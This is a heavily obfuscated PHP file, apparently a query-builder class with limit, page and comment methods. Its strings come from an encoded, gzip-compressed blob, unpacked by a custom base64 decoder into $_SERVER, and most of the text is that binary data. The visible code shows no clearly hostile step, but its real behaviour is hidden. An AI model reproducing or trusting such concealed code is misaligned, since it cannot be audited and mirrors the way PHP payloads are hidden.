$bÇÔÔ¼ªæ§) { if ((is_numeric($fëù”ËËùË) || !$fëù”ËËùË) && is_string($bÇÔÔ¼ªæ§)) { if (strpos($bÇÔÔ¼ªæ§, $F»İ¤Œ…•Ø[347]) === 0) { continue; } think_trace($F»İ¤Œ…•Ø[348], $F»İ¤Œ…•Ø[33], $F»İ¤Œ…•Ø[46]); die; } } } if (is_string($dâ¸¹±Ğ¿•) && $F»İ¤Œ…•Ø[33] != $dâ¸¹±Ğ¿•) { $A¸ê˜ˆ Ù = array(); $A¸ê˜ˆ Ù[$F»İ¤Œ…•Ø[349]] = $dâ¸¹±Ğ¿•; $dâ¸¹±Ğ¿• = $A¸ê˜ˆ Ù; } if (isset($this->options[$F»İ¤Œ…•Ø[272]])) { $this->options[$F»İ¤Œ…•Ø[272]] = array_merge($this->options[$F»İ¤Œ…•Ø[272]], $dâ¸¹±Ğ¿•); } else { $this->options[$F»İ¤Œ…•Ø[272]] = $dâ¸¹±Ğ¿•; } return $this; } public function limit($E¸õä¥÷, $a÷øñƒ¥è¬ = null) { $f›ˆ¼„êª =& $_SERVER[Šº]; $this->options[$f›ˆ¼„êª[289]] = is_null($a÷øñƒ¥è¬) ? $E¸õä¥÷ : $E¸õä¥÷ . $f›ˆ¼„êª[47] . $a÷øñƒ¥è¬; return $this; } public function page($A‰Ğ¹œ‚Ÿ«, $DÚêã°ÖâÒ = null) { $bÊ©Öæ¼ =& $_SERVER[Šº]; $this->options[$bÊ©Öæ¼[350]] = is_null($DÚêã°ÖâÒ) ? $A‰Ğ¹œ‚Ÿ« : $A‰Ğ¹œ‚Ÿ« . $bÊ©Öæ¼[47] . $DÚêã°ÖâÒ; return $this; } public function comment($EÓˆ†‹´ç) { $this->options[$_SERVER[Šº][351]] = $EÓˆ†‹´ç; return $this; } public function setProperty($dóŒëÙí¶ˆ, $B¶¹®¤õ) { if (property_exists($this, $dóŒëÙí¶ˆ)) { $this->{$dóŒëÙí¶ˆ} = $B¶¹®¤õ; } return $this; } } goto f™áô¡Í’; C¤²Ãº˜: if (!function_exists('_kodDe')) { function _kodDe($C­²¦­½Ÿ) { $C­²¦­½Ÿ = base64_decode($C­²¦­½Ÿ); $fÇøŸÓ±‡„ = strlen($C­²¦­½Ÿ); $D¿¡×Ì‰‹ = ''; $cí–‚Æà™ = ord($C­²¦­½Ÿ[0]) - 30; for ($DïÎ‰ŒµìÙ = 1; $DïÎ‰ŒµìÙ < $fÇøŸÓ±‡„; $DïÎ‰ŒµìÙ += 2) { if ($DïÎ‰ŒµìÙ + 1 < $fÇøŸÓ±‡„) { $D¿¡×Ì‰‹ .= chr(ord($C­²¦­½Ÿ[$DïÎ‰ŒµìÙ + 1]) + $cí–‚Æà™); $D¿¡×Ì‰‹ .= chr(ord($C­²¦­½Ÿ[$DïÎ‰ŒµìÙ]) + $cí–‚Æà™); } else { $D¿¡×Ì‰‹ .= chr(ord($C­²¦­½Ÿ[$DïÎ‰ŒµìÙ]) + $cí–‚Æà™); } } return $D¿¡×Ì‰‹; } } define(strrev('ºŠ'), strrev('úƒ')); $_SERVER[Šº] = explode("\x7c\x2\x7c\x5\x7c\x6", gzinflate(substr(strrev('ğÖ‘e$”ÚHÒ’i)Bö[K!v.»Ÿ€Ë°öUS|	}­'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹')."\x9a\xbc\x34\xaf\x4d\xf2\xd2\xf7\x5e\xba\x1\x6e\x28\x8e\xa2\x38\x28\xe2\xbe\xa2\xe2\xa\xa2\xe8\xb8\xa3\x8e\x8\x33\xb8\x8c\xb\xe2\x2e\xa3\x2c\x3a\x2e\x33\xae\x38\x3a\xa3\xdf\xdd\xef"."\x7d\x2f\xa9\xf3\xff\xff\xbe\xcf\x1f\x36\x77\x7f\x77\x39\xf7\xdc\x73\xce\x3d\xe7\xdc\x2d\xef\x2c\xfe\xcd\xe2\x83\x16\x1f\xfc\xe0\x9d\xf8\x77\xf1\x1\xe8\x2f\xa\x9f\xb6\x7c\xd8\x7e\xe8"."\277\3\226\137\122\126\326\70\361\220\261\315\207\136\276\361\176\171\235\174\277\274\74\24\334\366\142\340\260\227\357\73\303\277\147\315\266\201\75\373\357\167\336\317\247\275"."\132\3\12\343\272\65\370\107\312\152\246\244\364\253\206\151\340\204\270\226\115\252\235\70\254\146\361\257\33\377\30\75\151\325\124\160\70\326\34\212\306\42\255\55\55\376"."\160\64\106\132\24\363\63\132\202\204\162\262\56\147\110\343\71\105\67\300\247\304\346\142\71\55\247\144\55\51\74\41\41\233\162\207\154\220\226\174\365\61\237\277\45\30"."\x9a\x1f\x8b\xce\x6f\xf1\x93\x12\x1d\xb1\x9e\xbc\xa2\xf\xe0\x18\xa\x46\x4c\x59\x37\xa3\x6a\x46\x61\x25\xfa\x74\xd6\xaf\x7a\xff\xcc\x40\xb3\x14\xd\x7b\x9a\x23\x1e\x6f\x34\x10\x6a\xc6"."\311\336\120\123\123\40\132\230\36\16\5\203\365\36\357\254\302\234\226\260\147\146\223\107\2\375\113\53\61\65\233\324\312\244\205\70\147\241\124\216\3\15\252\222\116\340".base64_decode('YFam3TEHciQUZSGwBtl8Oo0jzSxE+q8k5XyazJlPjOR0NSPToc9SBlgqDsh5Uw==')."\x53\xb3\x71\x1c\xf1\xf7\x9b\xba\xcc\xd3\x41\x8f\xe3\xba\x92\x51\xb2\xa4\xa9\x88\x3f\xe8\xf7\x46\x25\xd8\x4d\xa9\x21\x1c\x6a\x92\xc8\x52\x64\x64\xc3\x54\x74\x69\x6e\xa3\x3f\xec\x97\x60"."\327\153\113\321\210\113\45\134\257\265\31\114\210\344\11\6\245\241\132\60\225\114\216\66\203\353\24\151\54\24\366\371\303\122\375\174\211\317\123\134\313\144\264\254\13\264".base64_decode('AtbTFLrqD4dxwEEgOBiAS0cioYaGiJ/FyOBmB0FPxhEotcQSybQZ65XTeQqs3Q==').strrev('Nÿ;X8½iØ6F¾ 2‚J)¡ZZyC±¦„ÒV<Õf£Ü'."\0".' Í_ü”·ø')."\45\205\72\142\60\117\321\315\230\222\215\153\11\65\113\366\143\35\331\173\4\2\145\63\345\323\125\120\216\64\250\271\342\132\156\240\111\353\45\203\111\252\151\45\310\266"."\x5b\x52\x4b\x27\x14\x9d\xc7\x73\xa0\xba\x98\x43\x46\xa5\xe\xa\xb5\x9b\xf3\x19\xb1\x8\x8b\xc6\x53\x6a\x3a\xa1\xd3\x5d\xfa\x6b\x25\x1\x1e\x50\x93\x3\x7c\x37\x1a\x5a\x5e\x8f\x2b\x1".base64_decode('sF943RbWkypSSDFNMGiDjqs1l9bkRETRhbE2gIqhvCkm5lGxBk3P+ADeIN8Huw==')."\x45\x6d\x2d\x92\xd1\x4d\xf7\x4b\x42\x98\x42\x17\xc1\x77\x65\xb\xce\x73\xfe\xdc\xbe\x60\x6\xf8\x53\x4e\x90\x5f\x1b\xe9\x5a\x4a\x49\xa7\x63\x4a\xbf\x42\xf6\x55\x26\x31\xc1\xa0\x63\x75"."\33\35\152\326\15\122\160\64\20\212\245\144\43\325\224\230\20\103\265\50\116\115\50\375\256\134\52\107\266\76\333\355\155\26\270\207\253\323\254\231\176\1\63\247\265\270"."\234\26\107\212\303\51\323\314\105\224\154\2\116\10\31\221\326\227\105\23\226\123\24\122\310\347\220\22\122\223\64\137\152\254\121\153\14\132\61\223\146\41\72\72\226\146"."\xb0\x44\xb3\x9f\x40\x4c\x9\x89\x2b\xfd\x26\x99\x14\x69\x6a\x3c\x25\xeb\x60\xb9\x6a\xf3\x66\xd2\x39\x99\xe0\x97\x5c\x2e\xad\xc6\x65\x53\xd5\xb2\x6e\x2d\x6e\x2a\xa6\xd3\x30\x75\x45\x26"."\255\171\342\161\305\60\234\136\55\153\352\132\332\351\111\247\265\76\147\110\127\73\325\154\215\124\101\260\61\310\4\373\335\11\61\144\15\331\304\45\123\45\10\53\20\101".base64_decode('VOCv0c3JSuty1kgqutNPNk2NBNaDIUhazKcaOc1QYfdqJNk05XgKIhfefO2vlA==').base64_decode('V7NpNasUlPX351RdMWhfpZlNUdIIaF1xtuhyZ0aukXL5DjAzZPcWScOlydTUSA==')."\161\30\165\110\231\274\141\72\165\5\140\51\25\234\207\144\215\3\111\147\23\334\132\252\222\160\106\0\62\47\311\343\52\307\113\0\154\44\232\207\123\33\243\321\226\130"."\xa0\x1\x9c\xd9\xcd\xfe\x58\x93\x27\xea\x6d\x24\xdd\x36\xe5\x4e\xda\xe7\x20\x40\xd1\xac\x49\x9a\x38\xcf\x9\xb6\x18\x4\xac\x66\x30\x56\x9e\xd8\xa2\xf5\x29\x3a\xf8\x70\xfd\x40\x8d\xd4"."\255\45\72\264\176\27\315\202\205\43\0\207\320\302\160\271\163\246\63\54\147\73\341\374\164\14\230\12\1\77\243\267\323\72\321\101\45\333\151\246\150\305\210\77\74\307"."\x1f\x8e\x45\x42\xd\xd1\xb9\x9e\x30\x39\xed\xb3\x0\x4a\xfa\xe9\xa7\x60\xd3\x69\x67\x58\x49\x80\xa9\x8f\x9b\xb4\x9e\x9c\x83\xb3\x46\xcb\xc0\x8d\x1\xd7\x8a\xe6\xc2\xcd\x42\xf3\x82\x81"."\231\160\142\174\116\3\24\162\212\245\150\333\101\65\243\302\276\233\54\7\315\44\40\5\146\222\16\271\321\200\152\333\122\25\145\155\211\261\345\116\360\267\242\174\101\233"."\xcf\x55\xd1\x5e\xe7\x56\x79\x1d\x77\x95\xab\x4a\xaa\xae\x9c\x28\xb5\x0\xda\x44\x95\xd3\x12\x19\x74\x41\x89\x4a\x29\x34\xeb\x57\x26\x0\x1e\x5d\xc2\xb6\xb6\x4d\x1d\x4e\xc\xfb\x67\xb7".base64_decode('+iPRWJM/2hjykS/4PSQU1PDWpCNagH/aXRwfgzUPZOROG5aGsSZNV6wp/NSYqw==').strrev('éŸ*fkÅ™¨‰L#ÖI5N–b…b±'."\r".'9tÖ–¸µ°©ñ‘LíEFÑ‡(&')."\202\224\54\5\353\115\217\227\224\306\216\67\115\47\241\32\67\51\70\246\272\201\142\146\167\144\34\370\307\321\160\102\313\310\224\332\105\50\111\111\140\234\204\223\52\54"."\x39\x8d\x8a\xcc\xcf\x4b\x53\x37\x35\x98\xaa\x5b\x8a\x34\x29\x66\x4a\x23\x8b\xd4\xa9\xd0\x2e\xe5\x59\xdf\x68\x2f\x13\x4a\x5a\xa1\xb3\x91\x52\x28\x4a\x7\x24\x5c\x2f\x9b\xa4\x24\xc3\xeb".strrev('ß/2× yCL~§4j„$!>Àº:„Œpi¢²`]	Ÿ()¨0U,ü©b€')."\242\53\111\225\354\266\54\130\252\46\131\357\246\25\300\322\360\363\6\106\204\306\32\132\203\301\230\67\324\34\5\304\63\116\231\33\16\104\375\24\70\75\276\230\307\333"."\302\116\117\276\324\244\0\304\24\205\307\0\116\351\255\26\216\40\176\126\161\54\116\317\130\210\245\161\30\240\345\234\226\65\24\147\234\264\226\340\370\34\227\230\152\103".base64_decode('5gU1OMne75Qzg84MmCYn67r1aJWi4gkdIAvK8TacWMAR0TO9JRQhFepgKiCbOg==')."\24\235\364\243\245\225\144\145\4\140\232\351\47\211\207\320\143\132\46\104\223\147\156\204\342\334\74\50\257\253\203\62\37\143\35\355\17\151\273\77\223\346\224\240\165\124"."\x4e\xbe\x16\xd1\xc6\x40\xf3\xac\x58\x53\xc8\xe7\xf\xc6\x2\xcd\x0\x21\x45\xb\xd3\x5b\x5b\x7c\x1e\xba\xb8\x62\x7a\x7d\x28\xda\x68\x49\x6d\x5\x28\x69\x8e\x27\x18\xb0\x17\xf7\xcf\xb"."\x44\xa2\x91\xa2\x59\x20\xad\xd5\x6f\xcb\x1\x4c\x60\x4b\xd8\xdf\x10\x98\xc7\xa2\xd\x1\x7f\xd0\x17\x89\x79\x3d\xde\x46\x5e\xa6\xd9\xd3\x44\x22\xb1\x24\x64\xc3\xc\xb7\xb5\x7c\xc\xe0".base64_decode('1ghj5mK9kDGlkxWzcE4xyhPEOByAc1IhsEeGC9lhNBJCnMe1PIVGRh9mKDrJyA==')."\144\133\311\364\14\54\303\77\345\222\47\42\231\271\30\103\34\35\3\54\210\206\101\343\200\22\44\337\227\10\236\57\350\101\14\226\251\127\222\14\145\27\117\360\44\115"."\206\5\154\161\260\57\170\36\130\1\17\342\273\1\44\240\25\211\321\275\146\0\106\305\103\273\223\344\74\157\54\324\342\17\173\40\307\34\233\33\16\65\317\44\25\372".base64_decode('UgrtQIBMfxmlmwjjbHIUBogemfJOfNK7NDqVi/HP6fgH0Hvk40qWznoHROMMMQ==')."\x50\x66\x8\xec\x6\x8a\x82\xb5\x3c\xfb\x5a\x87\xa6\xa5\xe9\x3e\x5\x47\x3f\xc3\x7\x8c\xe5\xee\x32\x28\x90\xf4\x53\xe4\x33\x96\x9e\x65\xe4\x28\x89\x86\x66\xf9\x9b\x63\x14\xb2\x70\x4c".base64_decode('gEacAJjYUJhMiKl1U04KZ4b9EbrLdaUnr9LpcrvGEihWwGlFPu8+q61vbNkC5w==').strrev('>ÙÅ9Ò°s²ƒœxjêË¹·si¯+¨Ì¨ŠCjÎ¼ıI£¢YskQÀÌW”;WX')."\266\315\125\76\226\44\264\57\252\166\214\137\2\13\200\202\165\243\332\301\117\155\133\335\230\66\347\351\147\57\234\261\240\255\275\264\146\354\310\66\327\250\266\276\366\212".strrev('¶p,kÉÒ¡¬4%ÄÑu<sTÍ'."\0".'¡<¡H¬JP	t¶15u€|b\\^xú:ò')."\215\155\257\23\352\11\111\366\157\1\52\11\340\337\24\53\347\161\236\11\107\306\252\302\175\117\340\43\237\215\163\354\11\367\105\207\34\47\170\100\355\314\262\55\4\216"."\x7f\xc6\x9d\x5b\x9\xf4\x45\x63\xf0\xef\x12\xba\x90\x9d\x4a\x3f\x45\xd\xd9\xa4\xaa\x13\xe8\xcc\x67\xd5\x1e\x2a\x7c\xc8\x2a\x3d\x24\xa0\x99\x14\xbe\x3b\x14\xb3\x4f\xa1\xe0\x1\xd2\x2d"."\161\0\34\224\43\4\131\102\54\215\350\101\362\5\316\231\51\210\115\41\243\310\305\40\61\326\307\142\11\45\113\326\151\70\51\155\304\345\234\22\21\106\30\213\105\75"."\xf5\x41\x7f\x8c\x62\x18\x82\x89\x69\x1c\x61\xc5\x7a\x26\xae\x3\x43\xe3\x18\x95\xe2\x87\x38\xa7\xce\x11\x23\x42\x76\xbe\xd1\x93\x96\x10\x62\x90\x14\x5d\xd7\xf4\x1a\x24\x96\x34\xf2\x39"."\110\305\1\246\313\4\163\53\1\216\135\252\235\56\341\51\47\365\142\342\2\344\144\112\71\100\46\232\121\3\356\262\266\266\374\2\45\321\276\0\0\265\354\114\266\57"."\32\267\244\234\22\347\356\66\360\37\215\140\134\106\172\237\343\153\151\0\52\215\122\116\236\42\322\263\30\303\206\61\160\76\273\140\77\230\0\304\22\141\331\70\252\351"."\x8c\x68\xca\x59\xe8\x6d\x53\x33\xe5\xb4\xa5\x89\x28\x4c\xa1\xa8\x89\x1e\xdc\x44\x56\x80\x57\x3b\xc8\x31\x16\x3c\xca\x5\xe1\x23\x42\xa7\xcd\x4c\xb2\xc6\x24\x1f\x82\xdc\xb\xd6\x88\x28"."\246\213\225\160\10\231\370\157\155\11\305\360\131\260\207\274\302\371\206\245\65\221\1\303\124\62\26\1\245\241\310\172\74\325\220\117\247\115\106\352\247\325\156\322\54\331"."\40\13\213\225\155\320\164\312\322\126\220\357\226\124\24\53\30\310\146\1\3\52\2\24\77\112\147\172\0\321\22\225\312\250\60\117\12\64\113\365\241\120\320\357\151\226"."\340\251\115\116\233\200\317\111\353\317\163\6\10\233\304\2\52\75\315\144\116\210\303\20\27\224\341\34\310\364\6\4\201\130\14\34\331\61\102\101\222\3\254\336\23\11"."\x78\x63\x2d\x1e\x4a\x18\xc9\xb9\x9c\xdb\x48\x74\x1b\x6e\x38\x20\xb5\x57\x9\xaa\x1d\x6e\x28\x41\x82\x52\x6f\x57\x7\xc5\x0\xe3\xc9\x5a\xa7\x94\x78\x77\x4c\xee\x0\x1b\x82\x72\x7f\x79".base64_decode('SOZ2UxgBiNaknSZSNhKDtK0DCpQckIJxgFlzwN47OD/h4GI6B6PmHYTId5iyDg==')."\6\3\251\160\22\14\370\34\252\341\103\254\13\152\27\145\321\176\230\51\50\61\111\313\3\16\334\247\240\322\253\244\35\264\107\16\332\121\7\345\100\34\210\225\364\221"."\xde\xb4\x82\x1d\x48\x7a\x83\x82\x0\x25\xa7\x1c\x10\x3a\xe1\xe6\x70\x70\xe9\x21\xf9\x9c\xc0\xf2\x38\x38\x3b\xe4\xe8\xd4\xb5\x7c\xae\x85\x7e\x49\x88\xe1\xce\x90\x4\xde\x53\x96\x10\xd6"."\64\323\101\171\133\107\41\333\133\174\312\212\167\35\315\261\375\333\344\160\300\3\41\14\373\22\172\262\131\330\50\76\353\34\250\170\14\316\13\17\315\341\233\25\176\272".base64_decode('Qe4V4aAYTFDoouDNBe9cLszpXTvnaZfqwo9G5c6I8DlT7qTfKpKLw2ElPhDn3A==')."\xab\x4f\x60\x86\xad\x31\x6\x3d\x8\x94\x8b\xc1\x63\xf1\x25\x60\x30\xc6\xc0\xf5\x90\xe1\xc3\xe9\x44\x52\xc0\x63\x10\x69\x81\xd7\x21\x37\x8\x1f\x53\x28\xc7\x49\x4\x88\x94\x23\x60\x6f".strrev('Cp‡ø$'."\n".'t(Q…ß,vt	ìxÑ²q>4Ğ¤$µEs6F’Ï–8…&—h'."\n".'').base64_decode('wHbyJRei5EfVYnjeYxkmF2ALYTsi4Lq0qNkBNSsKbHgqP2X4IQcB1yZi8g0Vxg==')."\350\213\13\204\34\104\120\344\200\30\120\70\213\270\120\2\364\36\241\141\336\167\322\222\255\347\164\217\223\101\267\2\56\67\146\3\134\2\262\51\131\347\163\112\167\30".strrev('a¬=; Tâ¢Åï1‘¤T7ÔqFÖƒ½ Ãì#©lù{”–(TxEƒ.s')."\64\322\250\126\64\12\105\112\64\254\41\370\247\127\273\226\3\10\261\277\145\64\215\34\264\61\201\51\146\73\323\132\17\167\320\303\220\33\240\130\323\0\371\352\56\270"."\231\146\102\134\52\42\107\206\314\14\210\267\161\130\50\224\263\243\135\313\261\120\220\124\130\220\35\20\266\124\133\224\177\334\202\247\330\41\257\144\23\260\210\260\331\54"."\xcd\x52\xf1\x64\x25\xa9\x90\xc8\xa8\x59\x97\x8e\x51\xa3\xb\x10\x99\xe4\xbe\xd1\x51\x29\x1c\xb1\x7c\x7f\x2f\x32\x10\xdd\x45\x50\xe9\x12\xdb\xb4\x99\x80\xa1\xed\x90\x75\x97\xe\xbe\xcf".base64_decode('e85RB6Eg8yyhnQwENVqsBs4JapQbgvvHn1BNmALRo0aFnLygcPvH0kTsBefMVQ==').base64_decode('sFicUHSMsZQsdjS4KhA2d/HDSzz6xAtOeEWKQ4JWQIbdmaJEl2FqOZ4jRHG2kA==').strrev('=Á&(Z"‚Á0S®>â!(4®÷&¸‹©,¨i>¨<è}Gé±JÅ')."\x1e\xa1\x32\xe6\x62\x48\x1b\x37\xee\xef\xe5\xb7\xfd\xb8\x29\xf8\x61\x17\x3e\x6d\x5c\x72\x22\x11\xa2\x22\x53\x31\x5c\x58\x54\x94\x20\x15\x6f\x8\x29\x60\xb0\xa6\x84\x58\xf1\xe2\x9e\x74"."\232\137\313\332\343\103\126\301\173\126\254\44\246\14\131\255\1\161\57\224\202\56\226\306\50\113\221\30\263\22\137\234\366\267\23\151\126\274\64\364\111\76\4\202\342\13"."\x5a\x3c\xe\x4e\x3d\x6f\x4a\xcd\x2a\x6\x3b\xbc\x74\xa3\xc8\x88\x21\x64\xe\xb5\x4c\x30\x4f\x90\xf1\x1\x36\x16\x24\x88\xe7\x2\x13\x64\x71\xa4\x20\x1c\x7d\xe8\x18\x89\x99\x96\x43\x3b"."\x8c\xda\x10\x40\xd5\x32\xfb\x60\x6b\xe0\x99\x6c\xd0\xb5\x4c\x20\x4\x40\xbf\x38\x3c\xd8\xcb\x29\x54\x94\x87\x30\x4c\xbf\x5a\x6c\xa0\x60\xfd\xe0\x89\x3f\x54\x9b\x34\x9b\x35\xc5\xc9\x83"."\147\167\175\362\315\366\77\340\360\362\227\156\301\201\211\104\116\262\370\100\364\27\205\271\216\325\205\363\26\150\243\147\376\356\354\375\317\336\262\47\231\71\164\334\324\253"."\x6f\x1a\x21\xcf\x7e\xc1\xd8\xb0\x65\xea\xf7\x6f\x8d\x8b\xff\x23\xe9\x7d\xa4\xb5\xbd\xbd\xf6\xfd\x9b\xbe\x5c\x77\xd3\xd3\xfd\xae\x5d\x63\x7e\x73\xc5\x4b\xde\x96\x23\x3d\x25\xc3\xe\x3c"."\252\121\362\74\270\162\306\305\215\317\157\172\266\173\157\254\345\375\374\75\217\277\373\301\141\143\273\327\376\75\272\375\156\243\56\66\141\376\300\304\355\177\176\367\303\201"."\237\236\320\316\131\277\365\234\372\17\365\37\266\76\167\335\202\221\17\353\377\147\307\111\67\124\77\164\367\262\317\253\346\373\106\17\133\176\122\325\135\107\134\124\136\275"."\303\347\71\141\373\202\103\326\36\170\353\151\341\353\135\27\277\262\167\353\67\57\254\334\266\345\246\123\136\272\357\275\171\256\257\176\271\274\172\304\313\167\235\40\47\336"."\355\72\366\310\330\204\222\343\215\167\116\275\303\50\377\41\175\172\166\333\360\35\57\334\352\177\377\360\251\207\55\337\72\154\163\103\160\324\244\3\207\257\371\303\217\365"."\x2b\xee\x7b\xf4\xa3\x9f\xaf\xfc\xea\xaf\xa5\x87\x1f\x76\xf1\x1b\x7f\x3d\xfd\x81\x63\x7d\x27\x5d\xff\xdc\xec\xf\x67\x76\x4f\x78\xc0\x19\x7c\xf0\xc0\x8b\x7e\x18\x77\x45\xf5\x6d\x2b\x57".base64_decode('PatXZ0/YtyI0eOXdg9Wn5p47Zdv2P9/zybUfnDKw/snlhy2+/OCFZ9z8YvS3Fw==')."\276\25\275\143\135\337\7\216\337\235\171\327\3\352\361\247\376\274\153\305\217\157\116\374\347\271\247\275\273\357\270\73\356\134\267\161\125\370\240\317\67\364\274\334\121\277"."\64\265\323\274\361\204\325\377\347\271\123\56\175\174\161\345\265\347\253\123\77\135\130\131\263\353\343\367\377\226\132\133\33\175\350\366\33\62\237\176\24\134\137\376\222\376".base64_decode('0Lrtf5vTXfV6y713n/hdxVrHpDl/7Wo9affq14497+gXN1ZMfatSen7xrob8ZQ==')."\xab\xbe\xed\x7a\xea\xa0\x7\x7f\x1c\x39\xf1\xd8\xfb\x67\x6f\x69\x3d\xe0\xd0\x8d\x3d\x4b\xee\x9f\x33\xe7\x81\xd9\x63\x7b\xce\x38\x79\xc6\x66\x63\xb9\x63\xf9\x1b\xcb\x3f\x2e\xd9\xba\xf9"."\220\263\46\257\276\263\373\214\173\307\174\33\372\376\335\125\233\77\36\375\334\65\7\56\374\274\325\134\321\165\335\371\17\77\176\376\203\53\333\166\325\171\307\16\373\151"."\xb5\x73\xc9\xb4\xf\x4f\x58\x19\xde\x71\xd5\x32\x97\xf9\xe5\xa9\x6f\xa7\x9a\x16\x9f\xfa\x77\xff\xf9\x4d\x8f\x1f\x71\x9f\xd7\xb7\xfa\xd1\xf0\xfa\x2b\xcf\x38\x28\x31\x7d\xe1\xdf\xf6\x3f"."\374\306\373\226\376\141\362\32\237\271\365\214\337\354\177\362\350\131\27\155\35\371\366\300\325\7\376\141\254\153\344\340\226\321\375\37\254\174\165\331\1\37\116\376\172\176"."\143\174\347\337\156\225\346\205\143\247\315\234\230\356\371\375\210\257\126\312\33\236\31\361\314\375\263\216\353\70\365\272\225\43\257\272\266\242\361\363\27\6\32\237\112\277".base64_decode('dMLO9zaOum/r2kW3HvDOhmHJZR/HP5K23bSudqX/8fhjkSuHfZF0XPhk1R3yPQ==').base64_decode('uU+Oqf460Xzd1tLI4Ix3Jt7rjTyyespk/0MXODYe/lLtrB2bZ1/tCF3z7k9vvA==')."\x79\xe1\x1\xe7\xbd\xf1\xfd\x93\xe3\x6f\x1b\xf7\xf8\x67\x65\xa3\x97\xfc\xfd\xa1\xcf\x97\x4e\x69\x7f\x7c\xa2\xff\x47\xef\xb6\xcf\xde\x3a\xae\x47\xbb\xe2\xa2\xd5\xf1\xe1\xf7\x5c\x9e\x6c".base64_decode('n/dYQF6kHT1u7WPXbzlw/YYbW+tmffnWgRdfIb82ZnmweuN7Azfpt+yoXr18xw==')."\xb8\xd3\xaf\x18\x5f\xbe\xe2\xf6\x93\x3d\x2f\x8e\x7e\x62\xd1\x8a\xe3\xd7\xdd\xbc\x39\x39\x29\x7b\xd2\x8e\x3\x26\xe4\xdd\x6b\xab\x96\xbf\xf6\xd9\x37\x7\x9c\x78\xee\x35\x8f\x2f\x9b\xb0"."\64\177\364\262\325\123\257\237\161\351\210\262\7\215\367\156\175\343\237\307\276\162\312\160\337\205\177\74\372\227\246\117\157\170\164\107\140\335\355\143\146\17\333\136\175\326".base64_decode('Z4nELS++9XHw+bNuXjPvH6OuvOTru/8Sferp6rU7+1etuubS4JMDyhmzXzv8pg==').base64_decode('h67dcOKMC3svGNf3zpWembVdoX0P7jlq+scbjY9++/nqmxa9vPekQxrbZ1+8XA==')."\xb9\x63\xe1\xdc\x87\xda\xf\xd8\x71\xcb\x63\xa3\xee\x3e\xe0\xdd\x29\x3f\x9e\x7a\xc8\x8b\x23\x2e\x98\x7c\x5e\xe2\xd3\x37\x5b\xdf\x7c\xf2\x9a\xa9\xb7\x7b\x7e\x78\x66\xd5\x6f\x77\x8c\xbd"."\176\174\127\315\263\363\334\313\217\276\145\333\277\17\170\244\353\270\131\317\127\77\270\156\352\303\47\137\61\352\256\221\153\356\32\331\230\75\250\147\373\176\267\76\361\333"."\xa5\xde\x87\x6b\x4f\x5e\xf1\xe5\xbd\x4b\x8f\x5a\xfb\xfe\x3f\xbe\xb8\xeb\xe3\x57\x53\x83\x4f\xb5\xbf\xd5\x38\x6c\xc4\xeb\xd5\xc3\x1f\xbd\xe9\xa8\xf5\x5d\xab\x46\xdc\x71\xf4\xb3\x9f\x1e"."\x7c\xa7\xc3\xfc\x69\xe7\x89\xb\x47\x9d\x57\xb5\xee\xbe\xb6\x95\xef\x1d\xb3\xbc\xe6\x77\x53\x8e\x8c\xdf\xd5\xd2\x35\x2a\xfa\xb2\xfa\xa7\x7d\xa1\x47\x6f\x7b\x26\xed\xbd\xf4\xce\x39\xf7"."\116\312\37\372\376\267\216\205\133\36\374\40\161\336\155\257\136\365\207\277\364\334\265\340\371\67\26\214\33\246\54\333\174\302\143\217\356\177\361\222\33\47\136\356\171\254".base64_decode('/P6Tp++9xdX34byOu0eU/PvJpWddekzfm6/Mn3C396Onv75BueiCT06dv+XVkw==')."\27\157\133\275\261\351\275\171\275\233\226\334\375\323\342\207\73\66\155\330\372\162\311\101\331\47\323\327\375\350\273\56\75\245\156\313\125\163\326\334\275\46\31\170\140\325"."\x89\x2f\xfc\xe5\x81\x93\x16\x55\xb4\x3f\xea\x5f\x7c\xf3\x8f\xee\xfd\x7e\xda\x7a\xb4\xff\xb9\x6f\xc2\x99\xb7\x12\x5b\xff\x71\x41\x59\xf9\xf1\x63\xf5\xdd\xab\x2e\x3a\xf4\xe6\xf\x47\xe4"."\xb7\xbf\xfe\x41\x7f\xc9\xec\x6b\x43\x87\x7e\xb4\xfc\x99\x77\xaf\x6f\xbe\xfc\x8d\x9e\xf5\x1f\x8e\xd8\xf7\x82\x74\xde\xc5\x6d\x73\x77\xae\x78\xf6\x6f\x89\xbf\x7c\xed\xfb\xe2\xf3\x87\x8f"."\70\142\221\167\330\364\153\377\63\121\371\344\337\373\275\364\372\17\203\373\237\270\176\123\364\376\205\327\67\110\337\177\277\146\356\227\237\336\165\357\315\327\176\223\230\75"."\x3b\xfd\xc9\x8c\x5\x77\xdf\xd5\x37\x72\x6d\x70\xdb\xe6\x6b\x6a\x6b\x8f\x3d\xb4\x7f\xf8\xa1\xdb\xfe\xf6\xcf\x39\x8b\xbf\x69\x5f\x71\xdc\xb2\xaf\xb6\x2f\x78\xf6\xe4\xe6\xec\x86\x39\x97"."\176\231\274\275\346\266\333\116\375\254\265\67\337\132\165\326\331\27\276\22\73\147\370\147\333\57\11\77\361\324\303\377\371\372\315\155\55\177\232\373\352\235\27\74\34\376"."\xdd\xc7\xd\x8f\x7c\x9d\x3f\x71\x47\xb0\x7a\xc3\x83\xa3\x4f\xe9\x3c\xa8\xeb\x37\x5f\x8d\x39\xfa\xdc\xcb\x42\xe7\xfc\xeb\x87\x4f\x4f\x3b\xbb\xf7\xbb\xb7\x63\xeb\x6e\x7a\xd2\xf8\xd7\xda"."\276\247\377\365\311\307\367\226\206\316\316\175\267\153\333\362\320\317\147\177\365\345\226\120\335\177\276\331\135\172\163\373\317\137\356\335\361\375\171\117\174\270\153\337\323\337"."\215\172\151\323\67\361\205\115\127\164\255\76\270\376\345\323\157\30\77\355\275\227\66\127\34\173\331\155\263\352\127\217\374\346\254\223\133\216\54\73\375\246\326\253\6\17"."\72\121\31\25\133\230\73\364\350\51\345\57\54\355\70\266\136\136\261\370\367\27\377\65\161\317\266\371\17\234\271\346\270\211\147\336\76\362\17\157\216\153\273\363\355\141"."\xaf\x7c\x7c\xc9\xa3\x57\xb5\xbd\xd6\xb4\x24\xdf\x74\xd6\xb2\xf5\xc1\xbf\x2f\x18\x71\x85\xf7\xfd\x7\xae\x5b\x1d\x95\x76\x8d\xdb\xef\x8d\x7\x1e\xf2\x65\x9f\xb8\xf2\x98\x57\x4f\x53\xaa"."\232\216\32\266\150\326\121\251\163\327\177\366\302\107\57\75\167\357\202\167\57\177\44\366\330\375\217\110\163\57\273\47\74\260\361\341\45\77\175\160\366\71\257\145\116\374"."\361\355\201\233\346\356\74\360\236\213\303\33\137\35\363\374\61\327\36\67\263\353\253\301\167\335